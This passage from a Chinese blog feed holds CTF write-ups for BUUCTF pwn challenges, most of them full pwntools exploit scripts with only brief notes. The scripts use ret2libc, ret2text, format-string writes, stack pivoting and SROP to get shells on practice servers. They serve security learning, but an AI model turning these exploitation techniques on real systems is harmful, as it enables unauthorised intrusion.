class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29537</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sysyem_plt = <span class="number">0x080484D0</span></span><br><span class="line">sh = <span class="number">0x80482EA</span>          <span class="comment"># 某字符串中含有“sh”即可</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(sysyem_plt) + <span class="string">b&#x27;dead&#x27;</span> + p32(sh))</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>想试试ret2libc但是失败了。。。</p><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29927</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = attachment.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = attachment.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = attachment.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">140</span> + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">140</span> + p32(system_addr) + <span class="string">b&#x27;dead&#x27;</span> + p32(str_bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题的libc只有选1才能跑出来。</p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>ret2libc。注意接受消息的长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29294</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = attachment.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = attachment.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = attachment.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>ret2text+整型溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27414</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;[+]Please input the length of your name:\n&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[+]What&#x27;s u name?\n&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><p>格式化字符串漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25583</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x0804A02C</span></span><br><span class="line">payload = <span class="string">b&#x27;AAAA%14$nxxx&#x27;</span> + p32(x)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># AAAA 0xffde975c 0x50 (nil) 0xf7feb000 0xf7feb918 0xffde9760 0xffde9854 (nil) 0xffde97f4 0x2d 0x41414141</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>栈迁移<br>虽然可以溢出，但是可以溢出的长度太短了，考虑对栈空间进行转移，用以塞下ROP链。<br>leave &#x3D; mov esp, ebp; pop ebp;<br>ret &#x3D; pop eip;<br>因此，我们可以通过两次leave,ret将ebp和esp转移到我们想要的地方。<br>通过第一组read和printf可以获取到ebp上的值。<br>动调可以发现ebp上的值与read(0, s, 0x30u)中的s相差0x38。<br><img src="/img/BUUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/ciscn_2019_es_21.png"></p><p><img src="/img/BUUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/ciscn_2019_es_22.png"><br>同时，因为需要进行两次leave-ret，因此第二遍payload前四位会被pop ebp用掉，构造时多加注意。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25403</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8048400</span></span><br><span class="line">leave_ret_addr = <span class="number">0x80485FD</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x27</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">s_addr = ebp - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="string">b&#x27;dead&#x27;</span> + p32(system_addr) + <span class="string">b&#x27;dead&#x27;</span> + p32(s_addr + <span class="number">16</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(s_addr) + p32(leave_ret_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>看雪上的大佬说：<br><img src="/img/BUUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/ciscn_2019_es_23.png"><br>赞！</p><h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27285</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400620</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>ret2libc<br>这道题不知道为什么不能用printf的got，要用read的got才行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25566</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line">fmt = <span class="number">0x400770</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">printf_plt = attachment.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = attachment.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = attachment.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi_ret) + p64(fmt) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat /home/babyrop2/flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>ret2libc。<br>这题的libc需要用BUU在FAQ中给你的，搜到的打不通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28589</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x080485B8</span></span><br><span class="line">fmt = <span class="number">0x080486F8</span></span><br><span class="line">printf_plt = attachment.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = attachment.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2C</span> + <span class="number">4</span>) + p32(printf_plt) + p32(main) + p32(fmt) + p32(printf_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;data!\n&#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You said: &#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">4</span>) + p32(system_addr) + p32(main) + p32(str_bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>ret2libc。<br>libc老老实实用人家给的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25288</span>)</span><br><span class="line">attachment = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = attachment.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = attachment.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = attachment.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;dead&#x27;</span> + p32(str_bin_sh)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>普通ROP打了一天也没打通，被迫学习SROP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25198</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x4004ED</span></span><br><span class="line">mov_rax_0F = <span class="number">0x4004DA</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">str_bin_sh = stack - <span class="number">0x118</span> <span class="comment"># 这里很奇怪，我自己算怎么算都是0x148，但是网上的题解只有0x118才能打通。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(str_bin_sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = str_bin_sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(mov_rax_0F) + p64(syscall) + <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27978</span>)</span><br><span class="line"></span><br><span class="line">win1 = <span class="number">0x080485CB</span></span><br><span class="line">win2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x18</span> + <span class="number">4</span>) + p32(win1) + p32(win2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>pwn你妈，不会，草。<br><a href="https://blog.csdn.net/qq_41696518/article/details/126677556">https://blog.csdn.net/qq_41696518/article/details/126677556</a><br><a href="https://blog.csdn.net/qq_29912475/article/details/129802716">https://blog.csdn.net/qq_29912475/article/details/129802716</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF二进制漏洞第一页部分题目&quot;&gt;&lt;a href=&quot;#BUUCTF二进制漏洞第一页部分题目&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF二进制漏洞第一页部分题目&quot;&gt;&lt;/a&gt;BUUCTF二进制漏洞第一页部分题目&lt;/h1&gt;&lt;p&gt;64位前几个</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF逆向工程-3</title>
    <link href="https://clovershrub.github.io/2023/04/05/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/"/>
    <id>https://clovershrub.github.io/2023/04/05/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/</id>
    <published>2023-04-04T16:00:00.000Z</published>
    <updated>2023-09-19T02:11:42.054Z</updated>
    
